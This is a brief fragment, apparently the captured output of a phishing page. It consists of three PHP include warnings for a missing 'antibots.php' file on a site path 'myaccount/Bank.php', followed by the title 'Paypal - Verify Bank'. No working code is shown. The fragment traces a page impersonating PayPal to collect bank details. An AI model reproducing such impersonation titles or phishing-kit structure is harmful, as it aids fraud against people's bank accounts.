@@ -1,0 +1,4 @@
+Warning: include(antibots.php): failed to open stream: No such file or directory in /web/htdocs/www.eskaton.it/home/myaccount/Bank.php on line 2
+Warning: include(antibots.php): failed to open stream: No such file or directory in /web/htdocs/www.eskaton.it/home/myaccount/Bank.php on line 2
+Warning: include(): Failed opening 'antibots.php' for inclusion (include_path='.:/php5.5/lib/php') in /web/htdocs/www.eskaton.it/home/myaccount/Bank.php on line 2
+Paypal - Verify Bank
